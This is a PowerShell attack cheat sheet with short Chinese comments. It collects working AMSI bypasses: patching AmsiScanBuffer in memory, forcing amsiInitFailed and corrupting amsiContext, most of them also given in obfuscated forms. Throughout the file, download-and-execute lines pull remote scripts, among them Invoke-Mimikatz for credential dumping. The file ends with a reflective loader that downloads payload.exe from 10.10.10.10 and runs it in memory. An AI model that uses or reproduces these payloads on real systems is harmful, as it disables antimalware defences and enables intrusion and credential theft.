
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/INotGreen/stub-Repositores/main/bypass.txt")

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1")

#amsi内存修补

$dcvrj = @"
using System;
using System.Runtime.InteropServices;
public class dcvrj {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr grtylw, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $dcvrj
$xymgyyn = [dcvrj]::LoadLibrary("$(('amsi'+'.dll').NoRmalIZe([chaR]([ByTE]0x46)+[chAr](111)+[Char]([ByTE]0x72)+[chAr]([byte]0x6d)+[cHaR]([Byte]0x44)) -replace [cHAR](92*1/1)+[ChAr](112)+[CHaR](123)+[chAr](77)+[ChAr]([ByTe]0x6e)+[cHaR]([bYTe]0x7d))")
$ppruhu = [dcvrj]::GetProcAddress($xymgyyn, "$([CHar]([BYte]0x41)+[cHAr]([Byte]0x6d)+[chAr](115+85-85)+[Char](105)+[ChaR](83+56-56)+[ChAr](99+13-13)+[CHar](97+59-59)+[ChAR]([byTE]0x6e)+[chAR]([BYTe]0x42)+[Char]([bYte]0x75)+[cHAR](44+58)+[ChAr]([BYte]0x66)+[CHaR]([bYTe]0x65)+[CHAR](114*92/92))")
$p = 0
[dcvrj]::VirtualProtect($ppruhu, [uint32]5, 0x40, [ref]$p)
$junr = "0xB8"
$ccwg = "0x57"
$boxa = "0x00"
$mcet = "0x07"
$tfwz = "0x80"
$dufv = "0xC3"
$scnfh = [Byte[]] ($junr,$ccwg,$boxa,$mcet,+$tfwz,+$dufv)
[System.Runtime.InteropServices.Marshal]::Copy($scnfh, 0, $ppruhu, 6)



#混淆
${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
Add-Type ${_/==\_/\__/===\_/}
${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
${/==\_/=\/\__/\/\/} = 0
[Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/})
${_/\__/=\/\___/==\} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy(${_/\__/=\/\___/==\}, 0, ${___/====\__/=====}, 6)



[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)



$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');$field.SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/INotGreen/stub-Repositores/main/bypass.txt")

#AST混淆
Set-Variable -Name w -Value ('System.Management.Automation.A');Set-Variable -Name c -Value ('si');Set-Variable -Name m -Value ('Utils');Set-Variable -Name assembly -Value ([Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)));Set-Variable -Name field -Value ($assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'));$field.SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/INotGreen/stub-Repositores/main/bypass.txt")






$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)


powershell -version 2;

#强制 AMSI 初始化失败 (amsiInitFailed) 将导致不会为当前进程启动扫描。目前，微软已经开发了一个签名来防止更广泛的使用。

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)


#量避免直接使用字符串可以用相同的方法规避 AMSI
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)



#amsiContext分配内存区域，并且由于“amsiSession”设置为 null 将导致错误

$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);

#混淆
SET  ("{0}{1}"-f'2qF','xA')  ( [tyPe]("{5}{3}{6}{2}{7}{9}{4}{11}{1}{0}{8}{10}" -f'mARs','.','NtIMe.InTer','S','iC','sY','TEM.rU','oPSER','hA','V','L','ES') )  ;$CVK = [TYPe]("{0}{1}" -F'R','eF')  ;${F`wi}= ( gEt-VArIABLE ("{0}{1}"-f'2','qfxA') -ValuEoNLy  )::("{1}{3}{0}{2}"-f 'HGlo','Allo','bal','c').Invoke((9076+8092-8092));$Cvk."asS`eM`BLy"."GeTty`Pe"("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))")."gE`T`FIeLD"("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", ("{1}{3}{0}{4}{2}"-f'ic,','Non','ic','Publ','Stat')).("{2}{1}{0}"-f'lue','etVa','S').Invoke(${nU`Ll}, ${nu`lL}); $cvk."assem`B`Ly"."g`ett`YPE"("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))")."g`EtfI`ELd"("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", ("{3}{4}{2}{1}{0}" -f'tic','blic,Sta','Pu','N','on'))."Se`T`VAluE"(${N`ULl}, [IntPtr]${f`WI});IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/INotGreen/stub-Repositores/main/bypass.txt")



 #powershell反射式加载


$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/payload.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[TotallyNotMal.Program]::Main()
